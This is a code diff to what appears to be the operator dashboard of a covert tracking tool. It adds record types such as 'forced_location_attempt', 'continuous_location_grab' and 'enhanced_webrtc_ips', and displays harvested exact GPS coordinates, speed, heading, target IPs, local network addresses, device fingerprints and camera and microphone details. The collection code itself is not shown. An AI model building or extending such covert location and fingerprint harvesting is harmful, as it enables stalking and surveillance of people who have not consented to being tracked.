@@ -362,11 +362,36 @@
         }
 
         function updateAccuracyStats(data) {
-            const exactGPS = data.filter(v => v.type === 'stealth_gps_location' || v.type === 'alternative_gps').length;
-            const cityLevel = data.filter(v => v.type === 'multi_ip_location' || v.type === 'ip_location').length;
-            const networkLevel = data.filter(v => v.type === 'webrtc_ips' || v.type === 'network_info').length;
+            const exactGPS = data.filter(v => 
+                v.type === 'exact_gps_location' || 
+                v.type === 'continuous_gps_tracking' || 
+                v.type === 'forced_location_attempt_1' ||
+                v.type === 'forced_location_attempt_2' ||
+                v.type === 'forced_location_attempt_3' ||
+                v.type === 'forced_location_attempt_4' ||
+                v.type === 'high_accuracy_gps' ||
+                v.type === 'continuous_location_grab'
+            ).length;
+            
+            const cityLevel = data.filter(v => 
+                v.type === 'multi_ip_location' || 
+                v.type === 'ip_location' ||
+                v.type === 'specific_ip_location'
+            ).length;
+            
+            const networkLevel = data.filter(v => 
+                v.type === 'enhanced_webrtc_ips' || 
+                v.type === 'network_info'
+            ).length;
+            
             const fingerprint = data.filter(v => v.type === 'advanced_fingerprint').length;
-            const hardwareInfo = data.filter(v => v.type === 'system_info' || v.type === 'camera_info' || v.type === 'microphone_info').length;
+            
+            const hardwareInfo = data.filter(v => 
+                v.type === 'system_info' || 
+                v.type === 'camera_info' || 
+                v.type === 'microphone_info'
+            ).length;
+            
             const ispInfo = data.filter(v => v.type === 'isp_details').length;
             
             document.getElementById('exactGPS').textContent = exactGPS + ' GPS points';
@@ -378,7 +403,10 @@
             
             // Update additional stats
             const gpsLocations = data.filter(v => v.latitude && v.longitude).length;
-            const deviceProfiles = data.filter(v => v.type === 'advanced_fingerprint' || v.type === 'system_info').length;
+            const deviceProfiles = data.filter(v => 
+                v.type === 'advanced_fingerprint' || 
+                v.type === 'system_info'
+            ).length;
             
             document.getElementById('gpsLocations').textContent = gpsLocations;
             document.getElementById('deviceInfo').textContent = deviceProfiles;
@@ -483,16 +511,55 @@
             let html = '';
             
             switch(data.type) {
-                case 'stealth_gps_location':
-                case 'alternative_gps':
+                case 'exact_gps_location':
+                case 'continuous_gps_tracking':
+                case 'forced_location_attempt_1':
+                case 'forced_location_attempt_2':
+                case 'forced_location_attempt_3':
+                case 'forced_location_attempt_4':
+                case 'high_accuracy_gps':
+                case 'continuous_location_grab':
                     html = `
                         <strong style="color: #4CAF50;">🎯 EXACT GPS COORDINATES:</strong><br>
                         <strong>Latitude:</strong> ${data.latitude?.toFixed(8)}<br>
                         <strong>Longitude:</strong> ${data.longitude?.toFixed(8)}<br>
                         <strong>Accuracy:</strong> ${data.accuracy}m<br>
-                        <strong>Altitude:</strong> ${data.altitude}m<br>
-                        <strong>Speed:</strong> ${data.speed} m/s<br>
-                        <strong>Heading:</strong> ${data.heading}°
+                        <strong>Method:</strong> ${data.method || data.type}<br>
+                        ${data.altitude ? `<strong>Altitude:</strong> ${data.altitude}m<br>` : ''}
+                        ${data.speed ? `<strong>Speed:</strong> ${data.speed} m/s<br>` : ''}
+                        ${data.heading ? `<strong>Heading:</strong> ${data.heading}°<br>` : ''}
+                        ${data.attempt ? `<strong>Attempt:</strong> ${data.attempt}<br>` : ''}
+                    `;
+                    break;
+                    
+                case 'specific_ip_location':
+                    html = `
+                        <strong style="color: #FF9800;">🌐 SPECIFIC IP LOCATION:</strong><br>
+                        <strong>Target IP:</strong> ${data.targetIP}<br>
+                        <strong>Location:</strong> ${data.city}, ${data.region}, ${data.country}<br>
+                        <strong>Coordinates:</strong> ${data.latitude?.toFixed(6)}, ${data.longitude?.toFixed(6)}<br>
+                        <strong>ISP:</strong> ${data.isp}
+                    `;
+                    break;
+                    
+                case 'enhanced_webrtc_ips':
+                    html = `
+                        <strong style="color: #2196F3;">🔗 ENHANCED NETWORK IPs:</strong><br>
+                        <strong>Local IPs:</strong> ${data.localIPs?.join(', ') || 'None detected'}<br>
+                        <strong>Total Candidates:</strong> ${data.allCandidates?.length || 0}<br>
+                        <strong>Method:</strong> Enhanced WebRTC
+                    `;
+                    break;
+                    
+                case 'enhanced_timezone_location':
+                    html = `
+                        <strong style="color: #9C27B0;">🕐 ENHANCED TIMEZONE LOCATION:</strong><br>
+                        <strong>Estimated City:</strong> ${data.estimatedCity}<br>
+                        <strong>Estimated Country:</strong> ${data.estimatedCountry}<br>
+                        <strong>Estimated Coordinates:</strong> ${data.estimatedLatitude?.toFixed(6)}, ${data.estimatedLongitude?.toFixed(6)}<br>
+                        <strong>Accuracy:</strong> ±${data.estimatedAccuracy}m<br>
+                        <strong>Timezone:</strong> ${data.timezone}<br>
+                        <strong>Language:</strong> ${data.language}
                     `;
                     break;
                     
@@ -617,13 +684,6 @@
                         <strong>Timezone:</strong> ${data.timezone}<br>
                         <strong>Offset:</strong> ${data.timezoneOffset} minutes<br>
                         <strong>Estimated Location:</strong> ${data.estimatedLocation?.city}, ${data.estimatedLocation?.country}
-                    `;
-                    break;
-                    
-                case 'webrtc_ips':
-                    html = `
-                        <strong>🌐 Network IPs (WebRTC):</strong><br>
-                        <strong>Local IPs:</strong> ${data.localIPs?.join(', ') || 'None detected'}
                     `;
                     break;
                     
